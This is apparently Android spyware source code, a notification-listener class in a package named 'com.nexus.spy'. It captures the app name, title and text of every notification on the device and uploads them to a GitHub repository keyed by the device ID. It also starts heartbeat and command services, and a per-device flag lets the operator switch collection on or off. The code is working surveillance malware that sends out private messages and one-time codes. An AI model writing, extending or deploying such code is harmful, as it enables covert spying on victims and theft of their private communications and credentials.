package com.nexus.spy;
import android.content.Intent;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.provider.Settings;
import org.json.*;
public class NotifListener extends NotificationListenerService {
    String deviceId;
    @Override public void onCreate() {
        super.onCreate();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        startService(new Intent(this, HeartbeatService.class));
        startService(new Intent(this, CommandService.class));
    }
    @Override public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            JSONObject devices = GithubApi.read("data/devices.json");
            if (devices == null) return;
            JSONObject dev = devices.optJSONObject(deviceId);
            if (dev == null || !dev.optBoolean("active", true)) return;
            String pkg = sbn.getPackageName();
            String title = String.valueOf(sbn.getNotification().extras.getCharSequence("android.title"));
            String body  = String.valueOf(sbn.getNotification().extras.getCharSequence("android.text"));
            String app = getAppName(pkg);
            String path = "data/notifs/" + deviceId + ".json";
            JSONArray arr = GithubApi.readArray(path);
            JSONObject n = new JSONObject();
            n.put("pkg", pkg); n.put("app", app); n.put("title", title); n.put("body", body);
            n.put("ts", System.currentTimeMillis());
            JSONArray newArr = new JSONArray(); newArr.put(n);
            for (int i = 0; i < arr.length() && i < 499; i++) newArr.put(arr.get(i));
            GithubApi.write(path, newArr.toString(), "notif " + deviceId + " " + System.currentTimeMillis());
        } catch (Exception e) {}
    }
    String getAppName(String pkg) {
        try { return getPackageManager().getApplicationLabel(getPackageManager().getApplicationInfo(pkg, 0)).toString(); }
        catch (Exception e) { return pkg; }
    }
}
